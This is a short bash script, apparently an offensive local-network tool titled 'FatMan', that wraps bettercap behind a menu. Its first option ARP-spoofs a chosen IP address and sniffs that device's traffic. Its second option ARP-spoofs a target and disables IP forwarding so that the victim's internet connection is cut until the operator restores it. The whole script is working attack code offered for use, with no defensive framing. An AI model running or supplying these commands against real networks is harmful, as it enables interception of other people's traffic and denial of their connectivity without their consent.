#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
NC='\033[0m'

anadizin=$(pwd)

while true
do

clear

echo -e "${RED}"

cat << EOF 

___________       __     _____                  
\_   _____/____ _/  |_  /     \ _____    ____   
 |    __) \__  \\   __\/  \ /  \\__  \  /    \  
 |     \   / __ \|  | /    Y    \/ __ \|   |  \ 
 \___  /  (____  /__| \____|__  (____  /___|  / 
     \/        \/             \/     \/     \/  


EOF
echo -e "${NC}"

echo ""
echo "1) Listen to devices"
echo "2) disconnect the device's internet"
echo "3) exit"
echo ""

read -p "make a selection : " secim2

if [[ "$secim2" == "1" ]]; then

 clear

 echo "The tool has started."
 echo ""

 read -p "Please enter an IP address : " ip

 read -p "Tool is starting up..."

 sudo bettercap -eval "set arp.spoof.targets $ip; arp.spoof on; net.sniff on"

 echo "The tool stopped."
 sleep 2
 continue

elif [[ "$secim2" == "2" ]]; then
 
 clear
 read -p "Please enter an IP address : " ip2
 clear
 echo "Please do not close the program directly."
 sleep 2
 echo "The user's internet connection is dropping."

sudo bettercap -eval "set arp.spoof.targets $ip2; set arp.spoof.fullduplex true; arp.spoof on" > /dev/null 2>&1 &
 BETTERCAP_PID=$!
 sleep 2

 sudo sysctl -w net.ipv4.ip_forward=0 

while true 
do 

echo "The device's internet connection has been cut off"
echo ""

clear

read -p "Press Y to turn the internet back on : " y


if [[ "$y" == "y" || "$y" == "Y" ]]; then
 
 sudo kill $BETTERCAP_PID > /dev/null 2>&1

 sudo sysctl -w net.ipv4.ip_forward=1

 clear

 echo "Everything is all set."

 sleep 2 
 break 

else
 clear
 echo "Enter only Y." 
 sleep 2
 continue
fi
done


elif [[ "$secim2" == "3" ]]; then

clear
    echo "Exiting..."
    # İP Yönlendirmesi 
    sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
    sleep 1
    
break 

else

 clear
 echo "Invalid selection; please try a different one."
 sleep 2
 continue

fi
done
